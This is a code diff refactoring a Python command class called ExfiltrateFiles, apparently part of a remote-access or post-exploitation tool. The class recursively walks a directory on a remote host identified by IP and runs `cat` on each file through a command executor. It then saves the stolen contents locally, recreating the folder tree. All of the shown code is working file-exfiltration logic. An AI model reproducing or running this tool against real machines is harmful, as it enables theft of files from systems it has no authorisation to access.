@@ -11,26 +11,39 @@ class ExfiltrateFiles(BaseCommand):
 
     def execute(self, path: str) -> None:
         for file in ListPathInfo(self.ip).execute(path):
-            full_path = str(Path(path).parent / file.name)
-            print(f"Downloading {full_path}")
+            full_path = Path(path) / file.name
 
             if file.is_dir:
-                print(f"Identified as folder")
+                print(f"Folder: {full_path}")
 
-                self.execute(full_path)
+                self.execute(full_path.as_posix())
             else:
-                print(f"Identified as file")
-                self._write_to_file(full_path, CommandExecutor.execute(self.ip, f'cat "{file.name}"'))
+                print(f"File: {full_path}")
+                self._write_to_file(str(full_path), CommandExecutor.execute(self.ip, f'cat "{file.name}"'))
+
+    def _write_to_file(self, path: str, data: bytes) -> None:
+        relative_path_to_file = self._get_relative_path_from_absolute(ROOT_DIR, path)
+
+        self._create_dirs(relative_path_to_file)
+
+        self._write_bytes_to_file(str(relative_path_to_file), data)
 
     @staticmethod
-    def _write_to_file(path: str, data: bytes) -> None:
-        new_path = Path(path.lstrip("\\"))
-        relative_new_path = ROOT_DIR / new_path
+    def _get_relative_path_from_absolute(local_path: str, remote_path: str) -> Path:
+        new_path = Path(remote_path.lstrip("\\"))
 
+        relative_path_to_file = local_path / new_path
+
+        return relative_path_to_file
+
+    @staticmethod
+    def _create_dirs(file_path: Path) -> None:
         try:
-            os.makedirs(str(relative_new_path.parent))
+            os.makedirs(str(file_path.parent))
         except OSError:
             pass
 
-        with open(relative_new_path, 'wb') as file:
+    @staticmethod
+    def _write_bytes_to_file(relative_path_to_file: str, data: bytes) -> None:
+        with open(relative_path_to_file, 'wb') as file:
             file.write(data)
